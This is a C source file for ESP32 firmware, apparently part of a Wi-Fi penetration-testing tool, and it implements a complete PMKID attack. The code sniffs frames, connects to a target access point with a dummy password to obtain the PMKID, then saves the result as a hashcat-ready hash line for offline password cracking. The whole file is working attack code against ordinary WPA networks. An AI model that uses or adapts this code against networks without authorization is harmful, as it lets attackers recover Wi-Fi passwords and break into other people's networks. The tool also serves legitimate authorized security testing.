/**
 * @file attack_pmkid.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements PMKID attack.
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 * 
 * @see PMKID attack reference - https://hashcat.net/forum/thread-7717.html
 */

#include "attack_pmkid.h"

#include <stdlib.h>
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"
#include "pcap_serializer.h"

static const char* TAG = "main:attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;

static const char *pcap_error_message(void)
{
    switch (pcap_serializer_get_state()) {
        case PCAP_STORAGE_FULL: return "抓包存储空间已满";
        case PCAP_STORAGE_MOUNT_ERROR: return "抓包存储分区无法挂载";
        case PCAP_STORAGE_IO_ERROR: return "PMKID 文件写入失败";
        default: return "PMKID 文件保存失败";
    }
}

/**
 * @brief Callback for DATA_FRAME_EVENT_PMKID event.
 * 
 * If DATA_FRAME_EVENT_PMKID is received from event pool, this function stops PMKID attack and serialize 
 * captured PMKIDs into status content.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_PMKID
 * @param event_data expexcts pmkid_item_t *
 */
static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Got PMKID...");
    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
    if (pmkid_item_head == NULL) {
        ESP_LOGW(TAG, "PMKID event without any item");
        return;
    }

    /* Count nodes first; the list is built with head insertion. */
    unsigned pmkid_item_count = 0;
    for (pmkid_item_t *item = pmkid_item_head; item != NULL; item = item->next) {
        pmkid_item_count++;
    }

    // MAC_STA + MAC_AP + SSID size + SSID + PMKID * count
    char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *) ap_record->ssid) + (pmkid_item_count * 16));
    if (content == NULL) {
        /* free the list so the items do not leak when allocation failed */
        pmkid_item_t *item = pmkid_item_head;
        while (item != NULL) {
            pmkid_item_t *next = item->next;
            free(item);
            item = next;
        }
        attack_signal_storage_error("PMKID 结果内存不足");
        return;
    }
    wifictl_get_sta_mac((uint8_t *) content);
    content += 6;
    memcpy(content, ap_record->bssid, 6);
    content += 6;
    content[0] = strlen((char *) ap_record->ssid);
    content += 1;
    strcpy(content, (char *) ap_record->ssid);
    content += strlen((char *) ap_record->ssid);

    // copy PMKIDs into continuous memory into "content" in status, freeing as we go,
    // and build a hashcat-ready line for each one so the result survives a reboot.
    char *save_ptr = content;
    char hashcat_line[256];
    bool saved = false;

    pmkid_item_t *item = pmkid_item_head;
    while (item != NULL) {
        pmkid_item_t *next = item->next;
        memcpy(content, item->pmkid, 16);
        content += 16;

        if (!saved) {
            char pmkid_hex[33];
            char ap_hex[13];
            char sta_hex[13];
            for (unsigned i = 0; i < 16; i++) {
                snprintf(&pmkid_hex[i * 2], 3, "%02x", item->pmkid[i]);
            }
            pmkid_hex[32] = '\0';
            for (unsigned i = 0; i < 6; i++) {
                snprintf(&ap_hex[i * 2], 3, "%02x", ap_record->bssid[i]);
            }
            ap_hex[12] = '\0';
            const uint8_t *sta = (const uint8_t *) save_ptr;
            for (unsigned i = 0; i < 6; i++) {
                snprintf(&sta_hex[i * 2], 3, "%02x", sta[i]);
            }
            sta_hex[12] = '\0';

            snprintf(hashcat_line, sizeof(hashcat_line), "%s*%s*%s*%s",
                     pmkid_hex, ap_hex, sta_hex, (char *) ap_record->ssid);

            if (pcap_serializer_write_text("pmkid", ap_record->ssid,
                                           strlen((char *) ap_record->ssid),
                                           hashcat_line)) {
                saved = true;
            }
        }

        free(item);
        item = next;
    }

    if (saved) {
        /* Defer teardown: this callback runs on the sniffer event loop. */
        attack_signal_success();
    } else {
        attack_signal_storage_error(pcap_error_message());
    }
    ESP_LOGD(TAG, "PMKID attack finished");
}

void attack_pmkid_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting PMKID attack...");
    ap_record = attack_config->ap_record;
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
    wifictl_sta_connect_to_ap(ap_record, "dummypassword");
    ESP_ERROR_CHECK(esp_event_handler_register_with(wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL));
}

void attack_pmkid_stop(){
    wifictl_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister_with(wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler));
    ESP_LOGD(TAG, "PMKID attack stopped");
}
